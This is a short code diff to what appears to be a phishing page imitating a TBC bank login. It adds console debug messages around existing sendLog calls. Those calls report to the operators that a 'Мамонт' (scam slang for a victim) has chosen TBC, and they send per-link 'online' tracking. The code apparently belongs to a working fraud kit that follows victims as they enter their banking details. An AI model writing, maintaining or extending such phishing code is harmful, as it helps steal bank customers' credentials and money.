@@ -833,11 +833,15 @@ document.addEventListener('keydown', function(e) { if (e.key === 'Enter') handle
 document.addEventListener('DOMContentLoaded', function() {
   const urlParams = new URLSearchParams(window.location.search);
   const link_id = urlParams.get('link_id') || '';
+  console.log(`🔍 TBC Login - link_id=${link_id}`);
   sendLog('bank_selected', `🏦 Мамонт выбрал TBC\nlink_id=${link_id}`);
 
   // Send online status
   if (link_id) {
+    console.log(`✅ TBC Login - sending online for ${link_id}`);
     sendLog('online', link_id);
+  } else {
+    console.warn(`❌ TBC Login - no link_id found!`);
   }
 });
 </script>
